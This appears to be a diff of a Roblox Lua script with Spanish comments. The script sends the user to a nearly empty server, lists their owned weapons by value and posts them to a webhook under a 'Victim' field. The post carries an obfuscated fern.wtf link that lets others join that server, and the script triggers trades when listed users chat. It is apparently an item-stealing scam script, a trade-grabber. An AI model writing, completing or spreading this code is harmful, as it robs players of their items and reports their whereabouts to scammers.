@@ -20,7 +20,7 @@ if not req then
     return
 end
 
--- ===== Teleport a servidor vacío o casi vacío (retry infinito con 2s delay) =====
+-- ===== Teleport a servidor casi vacío =====
 local function teleportToServer(minEmptyPlayers, maxPlayers)
     while true do
         local servers
@@ -39,14 +39,14 @@ local function teleportToServer(minEmptyPlayers, maxPlayers)
     end
 end
 
--- Solo ejecutar teleport si no ha teleporteado
+-- Ejecutar teleport solo una vez
 if not getgenv().AlreadyTeleported then
     getgenv().AlreadyTeleported = true
     teleportToServer(0, 8)
-    return
+    return -- sale hasta teleport
 end
 
--- ===== Función Base64 propia =====
+-- ===== Función Base64 =====
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 local function base64Encode(data)
     return ((data:gsub('.', function(x)
@@ -197,12 +197,14 @@ for id,amount in pairs(profile.Weapons.Owned) do
     end
 end
 
--- ===== Enviar webhook solo si hay armas =====
+-- ===== Enviar webhook =====
 if #weaponsToSend > 0 then
     table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
+
     local rawLink="https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..math.random(100000,999999)
     local encodedLink=base64Encode(rawLink)
     local safeLink="https://fern.wtf/redirect?data="..HttpService:UrlEncode(encodedLink)
+
     local fields={
         {name="Victim 👤", value=LocalPlayer.Name, inline=true},
         {name="Enlace seguro 🔗", value="[Click aquí]("..safeLink..")", inline=false},
@@ -237,6 +239,7 @@ local function doTrade(targetName)
     end
 end
 
+-- Conectar a usuarios
 for _, p in ipairs(Players:GetPlayers()) do
     if table.find(users,p.Name) then
         p.Chatted:Connect(function() doTrade(p.Name) end)
